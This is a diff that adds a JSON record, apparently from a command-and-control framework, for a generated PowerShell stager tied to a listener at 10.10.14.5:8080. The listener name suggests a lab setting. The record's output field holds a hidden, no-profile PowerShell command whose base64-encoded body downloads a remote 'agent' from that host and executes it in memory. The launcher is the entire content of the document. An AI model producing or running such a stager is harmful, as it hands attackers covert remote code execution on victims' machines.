@@ -1,0 +1,13 @@
+{
+  "id": 42,
+  "name": "stager-ps1-01",
+  "template": "multi_launcher",
+  "options": {
+    "Listener": "lab-http",
+    "Language": "powershell",
+    "Host": "10.10.14.5",
+    "Port": "8080",
+    "OutFile": ""
+  },
+  "output": "powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADAALgAxADAALgAxADQALgA1ADoAOAAwADgAMAAvAGEAZwBlAG4AdAAnACkA"
+}
